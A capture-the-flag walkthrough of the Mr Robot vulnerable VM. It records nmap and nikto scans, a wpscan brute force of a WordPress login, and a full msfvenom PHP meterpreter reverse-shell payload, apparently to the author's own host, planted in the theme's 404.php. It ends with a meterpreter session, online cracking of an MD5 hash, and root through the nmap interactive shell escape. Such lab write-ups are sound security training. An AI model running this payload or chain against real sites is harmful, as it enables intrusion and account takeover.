# [VMHacking] Mr Robot I

[HackingArticle link](http://www.hackingarticles.in/hack-mr-robot-vm-ctf-challenge/)
[VM Download](https://www.vulnhub.com/entry/mr-robot-1,151/)



</br>



## Scanning target: `nmap`

```sh
$ nmap -A ctf15.root-me.org
Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-06 15:50 GMT
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for ctf15.root-me.org (212.83.175.152)
Host is up (0.011s latency).
Not shown: 994 filtered ports
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 81:65:75:6a:b6:61:c0:d7:2b:70:d2:34:66:ef:91:cb (DSA)
|   2048 68:f6:18:5b:1b:6e:bc:0a:b1:f0:f4:92:23:11:79:68 (RSA)
|   256 3b:5c:8f:1a:eb:f5:e5:e4:78:be:30:3f:05:c9:33:c2 (ECDSA)
|_  256 e0:a7:8d:7f:ba:74:0d:6e:a9:9e:7b:07:5e:66:52:63 (EdDSA)
80/tcp   open   http        Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
113/tcp  closed ident
443/tcp  open   ssl/http    Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
2000/tcp open   cisco-sccp?
5060/tcp open   sip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.84 seconds
```

* **-A :**  Aggressive scan options : Enable OS detection, version detection, script scanning, and traceroute



</br>



## Gathering information on Webserver: `nikto`

```sh
$ nikto -h 212.83.175.152
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          212.83.175.152
+ Target Hostname:    212.83.175.152
+ Target Port:        80
+ Start Time:         2018-02-06 15:51:38 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.5.29
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x29 0x52467010ef8ad
+ Uncommon header 'tcn' found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /readme: This might be interesting...
+ Uncommon header 'link' found, with contents: <http://212.83.175.152/?p=23>; rel=shortlink
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ /admin/index.html: Admin login page/section found.
+ Cookie wordpress_test_cookie created without the httponly flag
+ /wp-login/: Admin login page/section found.
+ /wordpress/: A Wordpress installation was found.
+ /wp-admin/wp-login.php: Wordpress login found
+ /blog/wp-login.php: Wordpress login found
+ /wp-login.php: Wordpress login found
+ 7535 requests: 0 error(s) and 18 item(s) reported on remote host
+ End Time:           2018-02-06 15:58:00 (GMT0) (382 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

* **-h :**  Host(s) to target. Can be an IP address, hostname or text file of hosts. A single dash (-) maybe used for stdout. Can also parse nmap -oG style output



</br>



## Data collected

* `/robots.txt` : 
  * `fsocity.dic` : Useful dictionary to brute force a login page
  * `key-1-of-3.txt` : First key
* `/wp-login.php` :
  * `elliot` seems be a valid username. After some random test, the error message tell us that only the password is incorrect.



</br>



## Wordpress login brute forcing: `wpscan` 

```sh
$ wpscan --url http://ctf15.root-me.org/wp-login.php --wordlist fsocity.dic --username elliot --wp-content-dir wp-content   

> (5993 / 858161)  0.69%  ETA: 05:59:26
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.3
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://ctf15.root-me.org/wp-login.php/
[+] Started: Tue Feb  6 16:18:20 2018

[+] robots.txt available under: 'http://ctf15.root-me.org/wp-login.php/robots.txt'
[!] The WordPress 'http://ctf15.root-me.org/wp-login.php/readme.html' file exists exposing a version number
[!] emergency.php has been found in: 'http://ctf15.root-me.org/wp-login.php/emergency.php'
[+] Interesting header: SERVER: Apache
[+] Interesting header: SET-COOKIE: wordpress_test_cookie=WP+Cookie+check; path=/
[+] Interesting header: X-FRAME-OPTIONS: SAMEORIGIN
[+] Interesting header: X-POWERED-BY: PHP/5.5.29
[+] This site seems to be a multisite (http://codex.wordpress.org/Glossary#Multisite)

[+] WordPress version 4.3.1 (Released on 2015-09-15) identified from stylesheets numbers
[!] 46 vulnerabilities identified from the version number

[...] 

[!] The plugin bluetrait-event-viewer has been detected. It might record the IP and timestamp of every failed login and/or prevent brute forcing altogether. Not a good idea for brute forcing!
[?] Do you want to start the brute force anyway ? [Y]es [N]o, default: [N]
Y
[+] Starting the password brute forcer
  Brute Forcing 'elliot' Time: 00:01:17 <                                                                                                                                                  > (2894 / 858162)  0.33%  ETA: 06:22:26
  
  [+] [SUCCESS] Login : elliot Password : ER28-0652

  +----+--------+------+-----------+
  | Id | Login  | Name | Password  |
  +----+--------+------+-----------+
  |    | elliot |      | ER28-0652 |
  +----+--------+------+-----------+

[+] Finished: Tue Feb  6 16:19:54 2018
[+] Requests Done: 3245
[+] Memory used: 39.523 MB
[+] Elapsed time: 00:01:34
```



</br>



## Reverse shell in php

*Using the wordpress admin console, it is possible to modified a webpage like `404.php` to include a backdoor able to provide a shell to a remote machine.*

 

> Generate the PHP code

```sh
$ msfvenom -p php/meterpreter/reverse_tcp lhost=185.12.45.79 lport=64242 -f raw

Payload size: 1114 bytes
/*<?php /**/ error_reporting(0); $ip = '185.12.45.79'; $port = 64242; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

*=> Paste this code on http://ctf15.root-me.org/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen&scrollto=0 to edit the `404.php` page*



> Prepare your handler

```sh
$ msfconsole

msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 185.12.45.79
lhost => 185.12.45.79
msf exploit(multi/handler) > set lport 64242
lport => 64242
msf exploit(multi/handler) > exploit

[-] Handler failed to bind to 185.12.45.79:64242:-  -
[*] Started reverse TCP handler on 0.0.0.0:64242
```



=> **Handle it** by visiting the page : http://ctf15.root-me.org/wp-content/themes/twentyfifteen/404.php



```sh
[*] Sending stage (37543 bytes) to 212.83.175.152
[*] Meterpreter session 1 opened (10.8.1.10:64242 -> 212.83.175.152:49440) at 2018-02-06 16:40:27 +0000

meterpreter > shell
Process 3967 created.
Channel 0 created.

$ whoami
daemon
$ ls
404.php
archive.php
[...]
style.css
$ cd /home
$ ls
robot
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ ls -l .
total 8
-r-------- 1 robot robot 61 Feb  6 14:56 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Feb  6 14:56 password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```



</br>



## Cracking password

Go to: https://hashkiller.co.uk/md5-decrypter.aspx

```
c3fcd3d76192e4007dfb496cca67e13b MD5 : abcdefghijklmnopqrstuvwxyz
```



</br>



## Privilege escalation using `nmap` 

```sh
$ ssh robot@212.83.175.152
robot@212.83.175.152's password:
robot$ ls
key-2-of-3.txt	password.raw-md5
robot$ bash
robot@linux:~$ cat key-2-of-3.txt
Congratz! You got the second key. Try to get the last one ;)
robot@linux:~$ ls
key-2-of-3.txt	password.raw-md5
robot@linux:~$ nmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> shell
Unknown command (shell) -- press h <enter> for help
nmap> !sh
$ whoami
root
$ cd /root
$ ls
firstboot_done	key-3-of-3.txt
$ cat key-3-of-3.txt
3aff58d06f11622046e9891044e29c3f
```

